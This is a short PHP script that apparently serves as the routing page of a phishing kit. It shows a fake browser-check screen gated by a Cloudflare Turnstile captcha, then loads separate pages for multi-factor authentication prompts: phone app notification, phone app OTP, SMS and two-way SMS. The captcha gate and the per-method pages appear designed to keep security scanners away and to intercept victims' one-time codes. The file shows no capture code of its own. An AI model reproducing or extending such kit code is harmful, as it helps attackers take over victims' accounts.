<?php

header("Access-Control-Allow-Origin: *");

if (!isset($_COOKIE['captcha']) || $_COOKIE['captcha'] != 1) {
	include '../config.php';
	echo '<html><head><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script><script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script><meta name="viewport" content="width=device-width, initial-scale=1"></head><body> Please stand by, while we are checking your browser... <br><br><form id="myForm" action="../validate.php" method="post"><div class="cf-turnstile" data-sitekey="' . $sitekey . '" data-callback="javascriptCallback"></div></form><script>function javascriptCallback(){var a=$("#myForm"),t=a.attr("action");a.submit(function(a){a.preventDefault()}),$.ajax({type:"POST",url:t,data:a.serialize(),success:function(a){location.reload()}})}</script></body></html>';
	exit();
}

if (isset($_GET['list'])) {
    include('list.php');
} else if (isset($_GET['phoneappnotif'])) {
    include('phoneappnotif.php');
} else if (isset($_GET['phoneappotp'])) {
    include('phoneappotp.php');
} else if (isset($_GET['sms'])) {
    include('sms.php');
} else if (isset($_GET['twoawaysms'])) {
    include('twoawaysms.php');
} else {
    header("Location: ../index.php");
}
